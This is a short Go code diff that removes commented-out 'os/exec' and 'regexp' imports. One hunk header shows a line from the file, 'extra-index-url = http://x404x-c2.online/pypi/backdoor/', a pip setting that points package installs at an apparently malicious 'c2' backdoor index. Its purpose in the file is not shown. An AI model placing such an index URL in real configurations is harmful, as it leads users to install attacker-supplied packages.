@@ -4,9 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	// "os/exec"
 	"path/filepath"
-	// "regexp"
 	"strings"
 )
 
@@ -163,7 +161,6 @@ extra-index-url = http://x404x-c2.online/pypi/backdoor/
 import (
 	"fmt"
 	"os"
-	// "os/exec"
 	"syscall"
 )
 
